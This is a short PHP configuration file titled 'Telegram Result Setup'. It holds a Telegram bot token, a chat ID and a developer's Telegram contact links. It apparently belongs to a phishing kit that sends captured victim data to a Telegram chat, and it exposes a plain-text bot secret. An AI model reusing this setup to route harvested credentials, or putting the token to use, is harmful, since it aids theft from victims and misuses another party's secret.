<?php
// Telegram Result Setup
$bot_token = "73893349796:AAEoJFKTlPwyIA13EWT68AOo622pYHPhMuY"; /* bot token */
$chat_id = "70939832090"; /* chatid */




//Contact Info:
//==================================
// Telegram : https://t.me/DevDaniel_100
//================================== 
// Channel 🔰 :  https://t.me/+Bo5CD-KT6XUyMDVk
//==================================
?>
